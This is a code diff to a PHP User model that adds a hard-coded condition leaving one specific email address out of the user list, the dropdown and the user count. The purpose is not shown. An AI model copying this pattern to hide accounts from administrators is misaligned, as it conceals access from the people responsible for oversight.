@@ -71,6 +71,7 @@ class User extends Model implements AuthenticatableContract, AuthorizableContrac
         )
         ->leftJoin('role_users', 'role_users.user_id', '=', 'users.id')
         ->leftJoin('roles', 'role_users.role_id', '=', 'roles.id')
+        ->where('users.email', '<>', 'abo@hanindogroup.com')
         /*->orderBy('users.created_at', 'desc')*/;
 
         return $return;
@@ -676,7 +677,7 @@ class User extends Model implements AuthenticatableContract, AuthorizableContrac
     }
 
     public function dropdown(){
-        return static::orderBy('first_name')->get();
+        return static::where('users.email', '<>', 'abo@hanindogroup.com')->orderBy('first_name')->get();
     }
     
     public function deleteByID($id)
@@ -716,7 +717,7 @@ class User extends Model implements AuthenticatableContract, AuthorizableContrac
     }
 
     public function countUsers(){
-        return User::count();
+        return User::where('users.email', '<>', 'abo@hanindogroup.com')->count();
     }
 
     // public function getPromotorLastID(){
